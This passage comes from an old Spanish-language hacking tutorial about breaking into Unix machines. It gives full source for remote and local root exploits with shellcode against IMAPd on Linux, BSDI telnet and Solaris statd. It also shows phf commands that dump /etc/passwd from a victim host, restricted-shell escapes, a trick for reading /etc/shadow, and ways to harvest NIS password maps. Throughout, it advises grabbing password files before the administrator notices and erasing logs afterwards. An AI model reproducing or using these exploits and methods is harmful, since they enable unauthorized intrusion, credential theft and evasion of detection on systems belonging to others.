}

------------ FIN -------------------------------------------------------------

  La sintaxis para usar este codigo es:

  phf cat%20/etc/passwd www.maquinavictima.com            para hacer un cat 
  passwd

  phf id www.maquinavictima.com           para hacer un id

  phf ls www.maquinavictima.com           para hacer un ls

  etc... como veis la sintaxis es sencilla y mas comodo que usar el navegador.


        Para posteriores ediciones del texto comentare algun codigo
  interesante que tengo para explotar el phf asi como algun truquillo para
  obtener mas posibilidades de este bug. ;o) como pillar los ficheros de
  passwd si esta shadow, evitar filtrado de ip, etc... pensad que una maquina
  con phf es una maquina en la que puedes ejecutar y ver comandos
  remotamente.. asi que pensando un poco las posibilidades son infinitas :o)

  4.7.- XPLOITS QUE TE DAN DIRECTAMENTE UNA SHELL

        En este apartado, voy a poner unos cuantos xploits pero como he dicho 
  anteriormente, la red esta llena de xploits para todos los sistemas
  operativos y casi todas las versiones asi que aqui solo voy a poner unos
  cuantos.

        En fin, voy a poner uno que da directamente un shell de root debido al
  bug del impad ( puerto 143) en maquinas linux con RedHat:

------------ Codigo Fuente ---------------------------------------------------

/*
 * IMAPd Linux/intel remote xploit by savage@apostols.org 1997-April-05
 *
 * Workz fine against RedHat and imapd distributed with pine
 *
 * Special THANKS to: b0fh,|r00t,eepr0m,moxx,Fr4wd,Kore and the rest of
ToXyn !!!
 *
 * usage:
 *      $ (imap 0; cat) | nc victim 143
 *              |
 *              +--> usually from -1000 to 1000 ( try in steps of 100 )
 *
 *              [ I try 0, 100 and 200 - so1o ]
 */

#include <stdio.h>

char shell[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\xeb\x3b\x5e\x89\x76\x08\x31\xed\x31\xc9\x31\xc0\x88"
"\x6e\x07\x89\x6e\x0c\xb0\x0b\x89\xf3\x8d\x6e\x08\x89\xe9\x8d\x6e"
"\x0c\x89\xea\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\xe8\xc0\xff\xff\xff/bin/sh";

char username[1024+255];

void main(int argc, char *argv[]) {
        int i,a;
        long val;

        if(argc>1)
                a=atoi(argv[1]);
        else
                a=0;

        strcpy(username,shell);

        for(i=strlen(username);i<sizeof(username);i++)
                username[i]=0x90; /* NOP */

        val = 0xbffff501 + a;

        for(i=1024;i<strlen(username)-4;i+=4)
        {
                username[i+0] = val & 0x000000ff;
                username[i+1] = (val & 0x0000ff00) >> 8;
                username[i+2] = (val & 0x00ff0000) >> 16;
                username[i+3] = (val & 0xff000000) >> 24;
        }

        username[ sizeof(username)-1 ] = 0;

        printf("%d LOGIN \"%s\" pass\n", sizeof(shell), username);
}

------------ FIN -------------------------------------------------------------

        Otro para BSDI BSD/OS 2.1 y bien explicadito (aunque en ingles.. pero
   creo que es demasiado sencillo para traducirno no?):

------------ Codigo Fuente ---------------------------------------------------

/* Bug originally discovered by Theo de Raadt
<deraadt@CVS.OPENBSD.ORG> */

/* BSDI BSD/OS 2.1 telnet-exploit ; evil-term.c
**
** Written by Joseph_K the 22-Oct-1997
**
**
** Original shellcode by mudge@l0pht.com but modified a tiny bit...
**
** This program must be compiled for the BSDI architecture...
** You will need to transfer the file 'termcap' this program creates
** to the host you want to penetrate, possibly by anonymous FTP.
**
** Then start telnet and type:
**
** telnet> env def TERM access
** telnet> env def TERMCAP /path/and/name/of/uploaded/file
** telnet> open victim.host.com
**
** tadaa! r00t shell...
**
** However because of the invalid termcap entry, there can be some
** hazzles....You figure it out....
**
** Fy faen vad jag ar hungrig...
**
** Special Greetz to TWiLiGHT!
**
*/

#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

#define filename "./termcap"
#define entry   "access|Gimme r00t:\\\n :"
#define bufsize 1300
#define default_offset 870    /* Should work...*/

char shellcode[] =
   "\xeb\x35\x5e\x59\x33\xc0\x89\x46\xf5\x83\xc8\x07\x66\x89\x46\xf9"
   "\x8d\x1e\x89\x5e\x0b\x33\xd2\x52\x89\x56\x07\x89\x56\x0f\x8d\x46"
   "\x0b\x50\x8d\x06\x50\xb8\x7b\x56\x34\x12\x35\x40\x56\x34\x12\x51"
   "\x9a\x3e\x39\x29\x28\x39\x3c\xe8\xc6\xff\xff\xff/bin/sh";

long get_sp(void)
{
   __asm__("movl %esp, %eax\n");
}

int main(int argc, char *argv[]) {
   int i, fd, offs;
   long *bof_ptr;
   char *ptr, *buffer, *tempbuf;

   offs = default_offset;

   if(argc == 2) {
      printf("using offset: %d\n",atoi(argv[1]));
      offs = atoi(argv[1]);
   }

   if(!(buffer = malloc(bufsize))) {
      printf("can't allocate enough memory\n");
      exit(0);
   }


  if(!(tempbuf = malloc(bufsize+strlen(entry) + 50))) {
      printf("can't allocate enough memory\n");
      exit(0);
   }

   bof_ptr = (long *)buffer;
   for (i = 0; i < bufsize - 4; i += 4)
      *(bof_ptr++) = get_sp() - offs;

   ptr = (char *)buffer;
   for (i = 0; i < ((bufsize-strlen(shellcode)))/2 - 1; i++)
      *(ptr++) = 0x90;

   for (i = 0; i < strlen(shellcode); i++)
      *(ptr++) = shellcode[i];

   printf("Creating termcap file\n");

   snprintf(tempbuf, (bufsize+strlen(entry)+50), "%s%s:\n", entry, buffer);
   fd = open(filename, O_WRONLY|O_CREAT, 0666);
   write (fd, tempbuf, strlen(tempbuf));
   close(fd);
}

------------ FIN -------------------------------------------------------------

        Otro para Solaris 2.5.1:

------------ Codigo Fuente ---------------------------------------------------

/*
 statd remote overflow, solaris 2.5.1 x86
 there is a patch for statd in solaris 2.5, well, it looks like
 they check only for '/' characters and they left overflow there ..
 nah, it's solaris

 usage: ./r host [cmd]  # default cmd is "touch /tmp/blahblah"
                        # remember that statd is standalone daemon

 */

#include <sys/types.h>
#include <sys/time.h>
#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <rpc/rpc.h>
#include <rpcsvc/sm_inter.h>
#include <sys/socket.h>

#define BUFSIZE 1024
#define ADDRS 2+1+1+4
#define ADDRP 0x8045570;

/* up to ~ 150 characters, there must be three strings */
char *cmd[3]={"/bin/sh", "-c", "touch /tmp/blahblah"};

char
asmcode[]="\xeb\x3c\x5e\x31\xc0\x88\x46\xfa\x89\x46\xf5\x89\xf7\x83\xc7\x10\
x89\x3e\x4f\x47\xfe\x07\x75\xfb\x47\x89\x7e\x04\x4f\x47\xfe\x07\x75\xfb\x47\x8
9\x7e\x08\x4f\x47\xfe\x07\x75\xfb\x89\x46\x0c\x50\x56\xff\x36\xb0\x3b\x50\x90\
x9a\x01\x01\x01\x0


1\x07\x07\xe8\xbf\xff\xff\xff\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\
x02\x02\x02\x02";
char nop[]="\x90";

char code[4096];

void usage(char *s) {
  printf("Usage: %s host [cmd]\n", s);
  exit(0);
}

main(int argc, char *argv[]) {
  CLIENT *cl;
  enum clnt_stat stat;
  struct timeval tm;
  struct mon monreq;
  struct sm_stat_res monres;
  struct hostent *hp;
  struct sockaddr_in target;
  int sd, i, noplen=strlen(nop);
  char *ptr=code;

  if (argc < 2)
    usage(argv[0]);
  if (argc == 3)
    cmd[2]=argv[2];

  for (i=0; i< sizeof(code); i++)
    *ptr++=nop[i % noplen];

  strcpy(&code[750], asmcode);  /* XXX temp. */
  ptr=code+strlen(code);
  for (i=0; i<=strlen(cmd[0]); i++)
    *ptr++=cmd[0][i]-1;
  for (i=0; i<=strlen(cmd[1]); i++)
    *ptr++=cmd[1][i]-1;
  for (i=0; i<=strlen(cmd[2]); i++)
    *ptr++=cmd[2][i]-1;
  ptr=code+BUFSIZE-(ADDRS<<2);
  for (i=0; i<ADDRS; i++, ptr+=4)
    *(int *)ptr=ADDRP;
  *ptr=0;

  printf("strlen = %d\n", strlen(code));

  memset(&monreq, 0, sizeof(monreq));
  monreq.mon_id.my_id.my_name="localhost";
  monreq.mon_id.my_id.my_prog=0;
  monreq.mon_id.my_id.my_vers=0;
  monreq.mon_id.my_id.my_proc=0;
  monreq.mon_id.mon_name=code;

  if ((hp=gethostbyname(argv[1])) == NULL) {
    printf("Can't resolve %s\n", argv[1]);
    exit(0);
  }
  target.sin_family=AF_INET;
  target.sin_addr.s_addr=*(u_long *)hp->h_addr;
  target.sin_port=0;    /* ask portmap */
  sd=RPC_ANYSOCK;

  tm.tv_sec=10;
  tm.tv_usec=0;
  if ((cl=clntudp_create(&target, SM_PROG, SM_VERS, tm, &sd)) == NULL) {
    clnt_pcreateerror("clnt_create");
    exit(0);
  }
  stat=clnt_call(cl, SM_MON, xdr_mon, (char *)&monreq, xdr_sm_stat_res,
                (char *)&monres, tm);
  if (stat != RPC_SUCCESS)
    clnt_perror(cl, "clnt_call");
  else
    printf("stat_res = %d.\n", monres.res_stat);
  clnt_destroy(cl);
}

------------ FIN -------------------------------------------------------------

        Otro bug de System V (aunque es improbable que funcione) pero es
  bastante aclarativo de cuales pueden llegar a ser las naturalezas de los
  bugs:

        Existe un bug en Passwd+ o Npasswd que permite el acceso sin clave
  cuando la validez de la anterior ha expirado. Si el programa detecta que el
  usuario que quiere entrar (sabe quien es despues de poner el login) tiene
  el mismo password demasiado tiempo, le pide inmediatamente que lo cambie
  ğğSIN PEDIR EL PASSWORD ANTIGUO!!!, saldria esto:

        UNIX(r) System V Release 4.0 (good religious site)

        login: priest
        Sorry Passwd has expired
        Change:

        Y pones el que quieres y ya estas dentro :--> con una cuenta que tu
  has determinado el passwd jeje

        Para posteriores ediciones espero poner algunos mas, pero creo que es
  mejor que ponga bastantes en la seccion de pillar root ke es mas interesante
  ke esto :o)y ademas, sinceramente no se si vale la pena ya que se pueden
  encontrar con facilidad en la red.

  4.8.- OTROS METODOS

        En fin, aqui solo voy a comentar que hay muchisimos mas metodos para 
  conseguir cuentas ... directamente con muchisimos otros bugs y xploits que 
  rulan por ahi, usando el metodo de la fuerza bruta por algun servicio ( ftp,
  pop3, etc), spoofing, fallos de configuracion en ftp, alguna cuenta que
  pilles con un sniffer, fallos en los rpc, mas xploits remotos, defectos de
  configuracion, hijacking, etc... pero esto ya se comentara en posteriores
  ediciones si hay ganas ;o) o quizas en textos especificos para esos temas ya
  que este texto es de introduccion y tampoco lo quiero recargar demasiado.

  5.- SALIR DE SHELL RESTRINGIDA

        La idea es que una vez que tenemos una cuenta shell en un sitio y la
  shell esta muy restringida y no podemos hacer nada ( hay veces que ni
  siquiera te deja cambiar de directorio, ni ejecutar el gcc ni nada) hemos de
  buscar alguna manera de tener una cuenta un poco mas decente.

        Algunas veces, la solucion es probar con el login y el password de la
  shell pero entrando por otros puertos como el ftp, rlogin, etc. y gracias a
  dios algunas veces se obtienen cuentas con mejores prestaciones que la
  anterior. Puedes escribir un + + en el fichero .rhosts y hacer un rlogin,
  etc...otras veces, entrando por el ftp podemos sobreescribir algun fichero
  que sea el que nos esta activando las restricciones... queda bastante claro
  no? :)

        Asi ya podemos intentar pillar el fichero de passwd o ejecutar algun
  xploit para pillar otras cuentas o el rOOt.

        Otro metodo que a veces funciona, dependiendo de como se ha hecho esa 
  shell restringida (si esta bastante mal hecha) es el rulando un programa que 
  interactua con el shell como por ejemplo el vi:

  :set shell=/bin/sh

  y luego..

  :shell

        Otro sistema ke puede funcionar, si tienes una cuenta para mail es
  tocar el .pinerc... es decir, bajarlo por ftp, tocarlo en tu maquina y
  volverlo a subir.

        Si la cuenta no es muy restringida y deja correr el gcc, se puede
  compilar algun programa en c que te deje acceder al fichero de passwd aunque
  no tengas acceso a ese directorio. En la seccion de passwd y como cogerlos
  hay programas de este tipo.

        En fin, son metodos un poco cutres pero a veces funcionan. Ademas, en 
  general lo que se ha de hacer es examinar las variables de entorno que 
  tenemos en la shell y pensar si de alguna manera podemos inhabilitar las 
  restricciones aunque para esto se necesita tener un poco claro el unix.

  6.- CRACKEAR PASSWORDS EN MAQUINAS UNIX

        Suponiendo que con alguna de las tecnicas expuestas en el apartado
  anterior, hemos conseguido el famoso fichero /etc/passwd, ahora hay que
  obtener los passwd desencriptados.

  6.1.- Introduccion y algoritmo de cifrado.

        En los sistemas Unix, los logins y los passwords suelen estar en el
  fichero /etc/passwd ( a no ser que esten shadow ).

        En estos ficheros, el login es visible y el password esta encriptado
  por lo que tienen una forma como la que se muestra a continuacion:

  root:21gCqQc/zPWgU:0:0:Super-User:/:/bin/csh
  sysadm:*:0:0:System V Administration:/usr/admin:/bin/sh
  diag:*:0:996:Hardware Diagnostics:/usr/diags:/bin/csh
  daemon:*:1:1:daemons:/:/dev/null
  bin:*:2:2:System Tools Owner:/bin:/dev/null
  uucp:*:3:5:UUCP Owner:/usr/lib/uucp:/bin/csh
  sys:*:4:0:System Activity Owner:/var/adm:/bin/sh
  adm:*:5:3:Accounting Files Owner:/var/adm:/bin/sh
  lp::9:9:Print Spooler Owner:/var/spool/lp:/bin/sh
  nuucp::10:10:Remote UUCP User:/var/spool/uucppublic:/usr/lib/uucp/uucico
  auditor:*:11:0:Audit Activity Owner:/auditor:/bin/sh
  dbadmin:*:12:0:Security Database Owner:/dbadmin:/bin/sh
  rfindd:*:66:1:Rfind Daemon and Fsdump:/var/rfindd:/bin/sh
  guest:zpB5nSLLjDOx2:998:998:Guest Account:/usr/people/guest:/bin/csh
  4Dgifts::999:998:4Dgifts Account:/usr/people/4Dgifts:/bin/csh
  will:5fg63fhD3d5gh:9406:12:Will Spencer:/home/fsg/will:/bin/bash

        Donde cada campo viene separado por : y en los que el significado de
  cada campo es:

  Login: will
  Password encriptado: 5fg63fhD3d5gh
  Numero de identificacion del usuario (UID): 9406
  Numero de identificacion del grupo al que pertenece (GID): 12
  Nombre real: Will Spencer
  Directorio Home: /home/fsg/will
  Tipo de shell: /bin/bash

        En algunas lineas, el campo password es "*". Este password encriptado
  es invalido, o sea, no se corresponde con ningun password; por tanto, las
  cuentas que tienen alguna "*" en el campo password son cuentas a las que no
  se podra entrar y que son usadas por el sistema operativo.

        Si en el fichero de pass en el lugar del password aparece :: quiere
  decir que esa cuenta no tiene password, por lo que al introducir el login
  entras directamente.

        Respecto a la cadena de uid ( user identification) el "0" corresponde
  al rOOt. Igualmente, si hay otros users con uid=0, estos usuarios son rOOt
  a todos los efectos, o sea, tienen los mismos derechos que el rOOt ( nota
  para el que vaya un poco perdido, el rOOt es la persona que tiene un poder
  absoluto sobre el sistema pudiendo hacer todo lo que le plazca). Muchas
  veces solo habra un user con id 0 pero a veces hay varios con lo que se
  facilita el trabajo :o)

        Los usuarios que sin tener el uid=0 tienen el mismo gid que el rOOt,
  tambien tienen algunos privilegios por el hecho de pertenecer al grupo del
  rOOt. Igualmente, hay que observar los uid y los gid de otros personajes
  particulares del sistema como wwwadmin, admin, www, bin , etc.

        La siguiente cadena indica el directorio home, es decir al directorio
  que entraras cuando entres a esa maquina. La ultima cadena indica el shell
  que usaras por defecto cuando entres... hay varios tipos de shell.. sh,
  csh... pero eso se comenta en cualquier sitio que hable sobre unix por lo
  que para remitiros a las diferencias lo podeis mirar alli.

  Vamos a hablar un poco sobre el algoritmo de cifrado:

        El algoritmo de cifrado es el llamado DES, el cual era un algoritmo 
  practicamente indescifrable cuando se ideo, pero que con el paso del tiempo
  y la tremenda evolucion de la tecnologia, cada dia se hace mas posible su 
  desencriptado, dada la velocidad de los ordenadores actuales.

        Es casi imposible volver hacia atras a partir de un password para
  obtener la palabra original. La unica forma que se conoce de romper DES es
  a fuerza bruta, cosa que se consiguio a principios de 1997 en internet, con
  maquinas distribuidas (lo mismo que ahora intentan con RC5). Tardaron 4
  meses en romperlo, y eso que tuvieron suerte y solo tuvieron que probar una
  peque¤a parte de todas las posibles claves.

        Otro aspecto a destacar es la existencia del password aging, es decir
  que los password caducan. Esto es importante conocerlo ya que si los
  passwords se renuevan habitualmente, tendremos que acelerar nuestras
  acciones si no queremos que tras haber crackeado el fichero passwd, estos
  passwords ya hayan sido cambiados :o(

        Si existe el password aging, en el fichero de passwords las entradas
  seran del tipo:

  Pepe:cualquier,43:34:3:Pepe perez:/home/pepe

        El formato es del tipo passwd,Mmww donde M es el maximo numero de 
  semanas que pueden pasar hasta que el password sea cambiado y m es el 
  minimo intervalo en el que puede ser cambiado mientras que ww indica cuando 
  fue la ultima vez que se cambio el password.

  La relacion entre M, m y el numero real de semanas es:

  Caracter        Numero de semanas
  .               0
  /               1
  0-9             2-11
  A-Z             12-37
  a-z             38-63

        Asi, en el ejemplo de Pepe, el password contiene la extension ,43 que
  quiere decir que debe ser cambiado antes de 6 semanas ( ya que el 0
  corresponde al 2) y que debe permanecer al menos 3.

        Entonces la pregunta es.. si es casi imposible desencriptarlos.. ¨que
  hace unix/linux para leer el fichero cuando entras al sistema??. Simplemente
  lo que hace es leer el login y el passwd que introduces por el teclado, los
  encripta y si coinciden con los correspondientes en el fichero /etc/passwd
  ya estas dentro!!!

        Por tanto, la forma de atacar un fichero de passwords de Unix es
  precisamente la misma que usa el sistema operativo para verificar un
  password: encriptar muuuuchas palabras y comprobar cada una de ellas si
  coincide con el password encriptado. Si coincide, ya tenemos un password, y
  si no, probamos la siguiente palabra. Para hacer esto necesitamos tres
  cosas: una lista de palabras a probar, una lista con los passwords
  encriptados y un programa que haga las pruebas.

  6.2.- Conseguir el fichero de passwd estando dentro de la maquina

  6.2.1.- Introduccion

        Siempre que se tenga una cuenta en un sistema, debereis entrar en el
  para pillar el famoso fichero de passwd sobre todo si esa cuenta os la ha
  pasado otro hacker ya que el root puede darse cuenta que esa cuenta es
  peligrosa para sus intereses y cerrarla.

        Igualmente, antes de ir a pillarlo, haced un who para ver si esta el
  root.. aunque muchas veces aparece el root y realmente no esta ya que es
  facil hacer esto por lo que cada uno que vea lo que hace en estos casos
  aunque con un poco de sentido comun es sencilla la determinacion a tomar.

        Asi, si teneis el fichero de passwd tendreis muchisimas cuentas y os
  dara lo mismo que cierren la cuenta con la que entrasteis en principio
  aunque esto realmente no es asi por lo que no lo tomeis muy al pie de la
  letra ya que un root que se de cuenta de que tiene un hacker rondando (si
  el root controla el tema) siempre tiene las de ganar en esta batalla :(

        Ademas, es conveniente cambiar de cuentas para entrar al sistema ya
  que como se comentara mas adelante parte de lo que hagais en un sistema UNIX 
  se queda en los ficheros de logs por lo que si no conseguis root y borrais
  estos logs, vuestras huellas estaran ahi y nada mas que el root tenga algo
  de interes por la seguridad vera que ha habido un tio haciendo cosas
  inusuales, pero todo esto ya es otro cantar que ya se hablara mas adelante.

        El resumen de los anteriores parrafos es que lo mejor es una vez con
  una cuenta en el sistema, pillar el fichero de passwords y luego hacerse
  root y borrar todas las huellas... el problema es que no siempre todo esto
  es tan sencillo :(

        En fin, suponemos que hemos conseguido una cuenta por alguno de los 
  metodos anteriores, asi, si la cuenta no es muy restringida siempre podeis 
  hacer un "cat /etc/passwd". Si no tienen Shadow Passwords o NIS aparecera 
  una lista como la que habeis visto al principio. Sino, aparecera algo
  similar a esto:

  root:21gCqQc/zPWgU:0:0:Super-User:/:/bin/csh
  sysadm:*:0:0:System V Administration:/usr/admin:/bin/sh
  diag:*:0:996:Hardware Diagnostics:/usr/diags:/bin/csh
  daemon:*:1:1:daemons:/:/dev/null
  bin:*:2:2:System Tools Owner:/bin:/dev/null
  uucp:*:3:5:UUCP Owner:/usr/lib/uucp:/bin/csh
  sys:*:4:0:System Activity Owner:/var/adm:/bin/sh
  adm:*:5:3:Accounting Files Owner:/var/adm:/bin/sh
  lp::9:9:Print Spooler Owner:/var/spool/lp:/bin/sh
  nuucp::10:10:Remote UUCP User:/var/spool/uucppublic:/usr/lib/uucp/uucico
  auditor:*:11:0:Audit Activity Owner:/auditor:/bin/sh
  dbadmin:*:12:0:Security Database Owner:/dbadmin:/bin/sh
  rfindd:*:66:1:Rfind Daemon and Fsdump:/var/rfindd:/bin/sh
  guest:zpB5nSLLjDOx2:998:998:Guest Account:/usr/people/guest:/bin/csh
  4Dgifts::999:998:4Dgifts Account:/usr/people/4Dgifts:/bin/csh
  will:5fg63fhD3d5gh:9406:12:Will Spencer:/home/fsg/will:/bin/bash 

        Aunque el problema que se puede dar en muchos de estos sistemas, el 
  directorio que contiene el fichero passwd (este o no este shadow) no es de 
  acceso a usuarios que no sean root, por lo que en principio no conseguiremos 
  ver su contenido, pero eso se hara posible gracias a sucesivas llamadas a 
  getpwent(). Debemos nombrar este archivo como getpass y direccionar su 
  salida a un fichero tal como sigue:

  cc cogerPass.cc -o cogerPass > fichero

------------ Codigo Fuente ---------------------------------------------------

#include <iostream.h>
#include <pwd.h>

struct passwd *pw;

main()
{
   while ((pw = getpwent()) != NULL)
   {
      cout << pw->pw_name;
      cout << ":" << pw->pw_passwd;
      cout << ":" << pw->pw_uid;
      cout << ":" << pw->pw_gid;
      cout << ":" << pw->pw_gecos;
      cout << ":" << pw->pw_dir;
      cout << ":" << pw->pw_shell << endl;
   }

   endpwent();
}

------------ FIN -------------------------------------------------------------

        y tendreis el archivo de passwd renombrado con el nombre fichero con
  lo que ya podeis hacer lo que querais con el. Se os ocurre algo ¨?? XDD

  6.2.2.- PASSWORD SHADOWING

        En todo el texto nos hemos referido a este concepto sin explicar lo
  que es. Posiblemente lo tendria que haber comentado antes, pero espero que
  quien lea se leera todo el texto antes de hacer nada. En fin, no me enrollo,
  password shadowing consiste en un sistema de seguridad en el cual en el
  archivo etc/passwd no estan los ficheros encriptados, sino que habra algo
  del tipo:

  root:x:0:0:root:/root:/bin/bash
  bin:x:1:1:bin:/bin:
  daemon:x:2:2:daemon:/sbin:
  adm:x:3:4:adm:/var/adm:
  lp:x:4:7:lp:/var/spool/lpd:
  sync:x:5:0:sync:/sbin:/bin/sync
  shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
  halt:x:7:0:halt:/sbin:/sbin/halt
  mail:x:8:12:mail:/var/spool/mail:
  news:x:9:13:news:/usr/lib/news:
  uucp:x:10:14:uucp:/var/spool/uucppublic:
  operator:x:11:0:operator:/root:/bin/bash
  games:x:12:100:games:/usr/games:
  man:x:13:15:man:/usr/man:
  postmaster:x:14:12:postmaster:/var/spool/mail:/bin/bash
  nobody:x:-2:100:nobody:/dev/null:
  ftp:x:404:1::/home/ftp:/bin/bash
  guest:x:405:100:guest:/dev/null:/dev/null
  bhilton:x:501:100:Bob Hilton:/home/bhilton:/bin/bash
  web:x:502:100:Web Master:/home/web:/bin/bash
  mary:x:503:100:Mary C. Hilton:/home/mary:/bin/bash

        En los que como se puede observar, los passwd encriptados han sido 
  sustituidos por una x aunque podria ser un * u otros simbolos. En este tipo
  de sistemas de seguridad, el verdadero archivo de passwd esta en un fichero
  que no es el /etc/passwd, pero el problema es que ese archivo no es
  accesible para todo el mundo, sino que es de solo lectura por el root por lo
  que si eres un usuario normal, no podras leerlo en principio.

        A continuacion se muestra en que directorio puede estar el fichero
  shadow en los sistemas operativos mas usuales (obtenida de FAQ 2600):

        Para determinar el tipo de unix que corre, usa uname -a cuando estes
  ya dentro de la maquina, aunque se puede ver con un telnet u otros metodos.

  Unix                  Path                            Token
  -----------------------------------------------------------------
  AIX 3                 /etc/security/passwd              !
         or             /tcb/auth/files/<first letter     #
                              of username>/<username>
  A/UX 3.0s             /tcb/files/auth/?/*
  BSD4.3-Reno           /etc/master.passwd        *
  ConvexOS 10           /etc/shadpw                       *
  ConvexOS 11           /etc/shadow                       *
  DG/UX                 /etc/tcb/aa/user/                 *
  EP/IX                 /etc/shadow                       x
  HP-UX                 /.secure/etc/passwd               *
  IRIX 5                /etc/shadow                       x
  Linux 1.1             /etc/shadow                       *
  OSF/1                 /etc/passwd[.dir|.pag]            *
  SCO Unix #.2.x        /tcb/auth/files/<first letter   *
                              of username>/<username>
  SunOS4.1+c2           /etc/security/passwd.adjunct    ##username
  SunOS 5.0             /etc/shadow
                        <optional NIS+ private secure maps/tables/whatever>
  System V Release 4.0  /etc/shadow                     x
  System V Release 4.2  /etc/security/* database
  Ultrix 4              /etc/auth[.dir|.pag]              *
  UNICOS                /etc/udb                          *

        Una manera de conseguir el fichero de passwd si esta shadow y si usa
  libc 5.4.7 ( algunos aun la usan) es aprovechar que algunos comandos como
  ping, traceroute, rlogin y ssh estan suid por lo que se podra explotar como
  sigue:

  Ejecutas bash o sh
  Export RESOLV_HOST_CONF=/etc/shadow ( o el fichero en el que este 
  dependiendo del sistema operativo)
  Ping asdf

        Y si no ha fallado nada te imprimira el shadow  jeje. Con este metodo
  se pueden hacer mas kosas... pero es tan obvio que lo omito okis? jeje

  6.2.3.- NIS

        Otro concepto que se ha comentado a lo largo del texto es el de NIS
  por lo que a continuacion explico un poco lo que es.

        NIS (Network Information System) es un protocolo de nivel de
  aplicacion muy util para la gestion de configuraciones cliente/servidor en
  sistemas UNIX. Anteriormente era conocido como Yellow Pages y es un sistema
  de bases de datos distribuidas que proporcionan un metodo uniforme para el 
  almacenamiento y de recuperacion de la informacion sobre los recursos de
  red. En lugar de gestionar archivos como /etc/host /etc/passwd,/etc/group 
  independientemente en cada maquina de la red, este sistema posibilita que 
  solo haya una base de datos compartida por el resto de las maquinas clientes 
  en un servidor central.

        En fin, tras este rollo os preguntares y que mas nos da esto del
  NIS??, pues bien, es que una de la informacion ( mapas) que es compartida
  son los famosos ficheros de password que nosotros buscamos jeje. 

        Asi, si estas dentro de una maquina con NIS y os sale algo que parece
  un shadow en el fichero /etc/passwd posiblemente haya un NIS. Esto se puede 
  identificar como se ha comentado, mirando la ultima linea del fichero de 
  passwd y si es algo del tipo "+::0:0:::" o mirando los procesos del sistema,
  ya que el NIS siempre tendra corriendo ypserv y algunos procesos mas que 
  empiezan por yp, es decir, yp*. Bien, si ya tienes claro que corre NIS, lo
  que tienes que intentar es usar el ypcat tal como sigue:

  ypcat /etc/passwd > ~/passwd 

        y bajate el fichero passwd de tu directorio HOME usando FTP o como
  quieras. Mas adelante se comentaran varios metodos.

        En caso de que no tengais privilegios para ejecutar el "ypcat", o en
  caso de que el "ypcat" no este o por si acaso lo que aparece al ejecutar el
  "ypcat" vuelve a ser basura otra vez, tendreis que recurrir a otros
  programas para obtener los passwords como por ejemplo el pwget que tambien
  es usado para pillar shadows:

------------ Codigo Fuente ---------------------------------------------------

# This is a shell archive.  Remove anything before this line,
# then unpack it by saving it in a file and typing "sh file".
# This archive contains:
#	README		Makefile	pwget.1		pwget.c		

LANG=""; export LANG

echo x - README
cat >README <<'@EOF'

These utilities provided a common command level access to /etc/group and 
/etc/passwd much in the same way as getgrent(), getpwent(), et al.

This is especially useful if your system is running NFS and Yellow Pages. With 
Yellow pages, there is no easy command level interface for this information
that will give you the same results as the libc routines.

These routines use "getopt()" so make sure your system has it.

Edit the Makefile for your machine/os and for the owner, group, mode
and destination of the binary and the man page.

Install with: make install.

File list:
README		-	This file.
Makefile	-	Makefile.
pwget.1		-	Man Page.
pwget.c		-	Command source.

@EOF

chmod 664 README

echo x - Makefile
cat >Makefile <<'@EOF'
# Configure CFLAGS/LDFLAGS for your machine/OS
# for HP-UX and other Sys V systems:
CFLAGS= -O -DSYSV
# for VAX 4.[23] BSD, SunOS and other BSD based systems:
# CFLAGS= -O -DBSD

# Need getopt for pwget, include library that has it.
# System V based system (like HP-UX), 4.3BSD and SunOS have null 
LDFLAGS.
LDFLAGS=
# 4.2BSD requires getopt from someplace.
# LDFLAGS= -lgetopt

MODE=755
OWNER=bin
GROUP=bin
DEST=dest
MANMODE=444
MANOWNER=bin
MANGROUP=bin
MANDEST=man

all: grget pwget pwget.cat

install: installcmd installman

installcmd: pwget
	strip pwget
# use install for BSD and cpset for SYSV
#	install -c -o $(OWNER) -g $(GROUP) -m $(MODE) pwget $(DEST)
	cpset pwget $(DEST) $(MODE) $(OWNER) $(GROUP)
	ln $(DEST)/pwget $(DEST)/grget

installman: pwget.1
# use install for BSD and cpset for SYSV
#	install -c -o $(MANOWNER) -g $(MANGROUP) -m $(MANMODE) 
pwget.1 $(MANDEST)
	cpset pwget.1 $(MANDEST) $(MANMODE) $(MANOWNER) 
$(MANGROUP)

grget: pwget
	ln pwget grget

pwget: pwget.o
	cc $(LDFLAGS) -o pwget pwget.o

pwget.o: pwget.c
	cc $(CFLAGS) -c pwget.c

pwget.cat: pwget.1
	tbl pwget.1 | nroff -man -T > pwget.cat

clean:
	/bin/rm -f pwget.o pwget grget

clobber: clean
@EOF

chmod 664 Makefile

echo x - pwget.1
cat >pwget.1 <<'@EOF'
.TH PWGET UTIL "" "" ""
.ad b
.SH NAME
